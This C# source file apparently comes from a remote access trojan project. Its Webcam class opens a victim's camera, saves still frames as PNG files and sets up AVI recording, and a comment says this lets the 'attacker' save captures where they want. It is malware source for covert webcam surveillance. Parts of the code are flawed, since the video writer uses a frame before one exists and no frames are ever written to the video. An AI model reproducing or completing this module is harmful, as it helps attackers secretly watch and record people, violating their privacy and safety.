using System;
using System.IO;
using System.Drawing;
using AForge.Video;
using AForge.Video.DirectShow;
using Accord.Video.FFMPEG;

namespace remote_access_trojan
{
    class Webcam
    {
        //variables for accessing wecam and using it
        private FilterInfoCollection webcam = new FilterInfoCollection(FilterCategory.VideoInputDevice);
        private VideoCaptureDevice capture = null;
        private Bitmap bit = null;
        private VideoFileWriter writer;
        private bool needPicture = false;
        private int pictureIndex = 1;

        public Webcam()
        {
            capture = new VideoCaptureDevice(webcam[0].MonikerString);
            capture.NewFrame += new NewFrameEventHandler(capture_NewFrame);
            capture.Start();
        }

        //Turns on the camera
        public void StartVideo(int index)
        {
            writer = new VideoFileWriter();
            writer.Open(Path.Combine(Directory.GetCurrentDirectory(), "webcam-vid" + index + ".avi"), (int)Math.Round((double)bit.Width, 0), (int)Math.Round((double)bit.Height, 0));
        }
        
        //Stops recording
        public void StopVideo()
        {
            writer.Close();
            StopWebcam();
        }

        //cam_NewFram handler
        private void capture_NewFrame(object sender, NewFrameEventArgs eventArgs)
        {
            if (needPicture)
            {
                bit = (Bitmap)eventArgs.Frame.Clone();
                bit.Save(Path.Combine(Directory.GetCurrentDirectory(), "webcam-pic" + pictureIndex + ".png"));
                needPicture = false;
            }
        }

        //Takes a screenshot and allows attacker to save where they want
        public void TakePicture(int index)
        {
            pictureIndex = index;
            needPicture = true;
        }

        //Stops camera
        private void StopWebcam()
        {
            if (capture != null && capture.IsRunning)
                capture.Stop();
        }
    }
}
